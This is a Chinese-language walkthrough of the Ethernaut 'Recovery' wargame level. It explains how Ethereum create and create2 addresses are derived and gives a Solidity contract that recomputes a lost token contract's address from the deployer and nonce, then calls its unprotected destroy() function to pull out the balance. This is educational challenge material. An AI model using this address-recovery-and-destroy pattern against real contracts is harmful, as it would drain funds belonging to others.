# Recovery

## Reference
[Recovery](https://ethernaut.openzeppelin.com/level/17) 

[Recovery.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/17-Recovery/Recovery.sol)

[Calculate_Sc](https://ethereum.stackexchange.com/questions/24248/how-to-calculate-an-ethereum-contracts-address-during-its-creation-using-the-so)

## 目标
根据 `nonce` 重新计算 `new` 关键字创建的合约地址
## 分析
1. ` A_{ct}=Keccak_{256}(A,N)[0..160]`
2. `create` 关键字通过msg.sender和nonce值生成并部署新的合约地址
3. `A_{cr}=Keccak256( 0xff, A, salt, \\Keccak256(initialisation\_code))[0..160]`
4. `create2` 关键字允许自定义 `salt` 值和 合约code, 用于生成新的合约地址。因此，相同的 `salt和合约code` 可以部署出相同的合约地址
### new
```solidity
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
``` 
1. `new` 关键字通过 `create` 创建新的合约地址
2. 需要实现代码，找出根据 `合约地址和nonce` 计算出的合约实例地址
```solidity
contract FindLostSC {
    function addressFrom(address _origin, uint256 _nonce) public {
        bytes memory data;
        if (_nonce == 0x00)
            data = abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                _origin,
                bytes1(0x80)
            );
        else if (_nonce <= 0x7f)
            data = abi.encodePacked(
                bytes1(0xd6),
                bytes1(0x94),
                _origin,
                uint8(_nonce)
            );
        else if (_nonce <= 0xff)
            data = abi.encodePacked(
                bytes1(0xd7),
                bytes1(0x94),
                _origin,
                bytes1(0x81),
                uint8(_nonce)
            );
        else if (_nonce <= 0xffff)
            data = abi.encodePacked(
                bytes1(0xd8),
                bytes1(0x94),
                _origin,
                bytes1(0x82),
                uint16(_nonce)
            );
        else if (_nonce <= 0xffffff)
            data = abi.encodePacked(
                bytes1(0xd9),
                bytes1(0x94),
                _origin,
                bytes1(0x83),
                uint24(_nonce)
            );
        else
            data = abi.encodePacked(
                bytes1(0xda),
                bytes1(0x94),
                _origin,
                bytes1(0x84),
                uint32(_nonce)
            );
        address target = address(uint160(uint256(keccak256(data))));
        SimpleToken st = SimpleToken(payable(target));
        st.destroy(payable(msg.sender));
    }
}
```
3. 根据编码规则和参数，找出失落的合约实例，直接调用 `destroy()` 函数，强制转移合约余额
